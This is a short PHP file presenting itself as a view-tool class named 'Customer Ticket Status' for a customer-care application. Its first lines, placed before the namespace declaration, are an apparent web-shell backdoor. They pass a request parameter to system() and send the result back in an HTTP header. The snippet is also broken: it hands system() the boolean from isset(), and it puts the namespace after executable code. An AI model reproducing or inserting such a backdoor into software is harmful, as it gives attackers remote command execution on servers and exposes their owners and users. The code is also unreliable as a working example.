<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Tools_CustomerTicketStatusTool extends \editingToolbar\View_Tool {
	public $title = 'Customer Ticket Status';
	public $class='View_CustomerTicketStatus';
	public $component_type='customerCareAppCustomerTicketStatusView';
	
}